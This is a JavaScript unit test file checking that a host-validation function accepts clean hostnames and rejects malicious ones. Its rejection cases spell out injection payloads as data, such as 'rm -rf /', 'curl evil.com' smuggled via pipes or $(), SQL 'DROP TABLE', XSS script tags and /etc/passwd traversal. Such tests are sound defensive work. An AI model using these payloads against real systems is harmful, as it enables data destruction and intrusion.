import { testHelperProxy } from '/test/test-helper.mjs';
import { executeScenario } from '/test/unitTestUtils.mjs';
import { validateAndTrimHost } from '/lib/securityLib.mjs';

const LIB = '0600 validateAndTrimHost.mjs';
console.log(`${LIB}: starting.`);

let assertions = [];

const ERR_MSG_INVALID_CHARACTERS = 'Host parameter contains invalid characters';
const ERR_MSG_REQUIRED = 'Host parameter is required';

const scenarios = [
  {
    name: 'Valid IP address',
    input: {
      host: '11.6.111.42',
    },
    expected: {
      value: '11.6.111.42',
    },
  },
  {
    name: 'Valid domain name',
    input: {
      host: 'api.example.com',
    },
    expected: {
      value: 'api.example.com',
    },
  },
  {
    name: 'Valid domain with hyphens',
    input: {
      host: 'my-service.example-site.com',
    },
    expected: {
      value: 'my-service.example-site.com',
    },
  },
  {
    name: 'Requires trimming',
    input: {
      host: ' my-service.example-site.com  ',
    },
    expected: {
      value: 'my-service.example-site.com',
    },
  },
  {
    name: 'Includes port number',
    input: {
      host: 'localhost:8080',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'XSS attempt',
    input: {
      host: "example.com<script>alert('xss')</script>",
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'Command injection with semicolon',
    input: {
      host: 'example.com; rm -rf /',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'Command injection with ampersand',
    input: {
      host: 'example.com && malicious-cmd',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'Command injection with pipe',
    input: {
      host: 'example.com | curl evil.com',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'Command injection with backticks',
    input: {
      host: 'example.com`whoami`',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'Command injection with dollar substitution',
    input: {
      host: 'example.com$(curl evil.com)',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'SQL injection attempt',
    input: {
      host: "example.com'; DROP TABLE users; --",
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'SQL injection with quotes',
    input: {
      host: 'example.com" OR 1=1 --',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'Path traversal injection',
    input: {
      host: 'example.com/../../../etc/passwd',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'URL parameter injection',
    input: {
      host: 'example.com/?admin=true',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'URL fragment injection',
    input: {
      host: 'example.com#redirect=evil.com',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'Windows path traversal',
    input: {
      host: 'example.com\\\\..\\\\windows\\\\system32',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'URL encoded script injection',
    input: {
      host: 'example.com%3Cscript%3E',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'JavaScript URI scheme',
    input: {
      host: 'javascript:alert(1)',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_INVALID_CHARACTERS,
    },
  },
  {
    name: 'Empty string',
    input: {
      host: '',
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_REQUIRED,
    },
  },
  {
    name: 'Null value',
    input: {
      host: null,
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_REQUIRED,
    },
  },
  {
    name: 'Undefined value',
    input: {
      host: undefined,
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_REQUIRED,
    },
  },
  {
    name: 'Non-string value',
    input: {
      host: 12345,
    },
    expected: {
      error: true,
      stackToInclude: ERR_MSG_REQUIRED,
    },
  },
];

for (const scenario of scenarios) {
  const zeroArityFun = () => {
    return validateAndTrimHost(scenario.input.host);
  };

  const scenarioResults = executeScenario(scenario, zeroArityFun);

  if (scenarioResults.assertions.length > 0) {
    assertions = assertions.concat(scenarioResults.assertions);
  }

  if (scenarioResults.applyErrorNotExpectedAssertions) {
    assertions.push(
      testHelperProxy.assertEqual(
        scenario.expected.value,
        scenarioResults.actualValue,
        `Scenario '${scenario.name}' did not return the expected value.`,
      ),
    );
  }
}
console.log(
  `${LIB}: completed ${assertions.length} assertions from ${scenarios.length} scenarios.`,
);

assertions;
export default assertions;
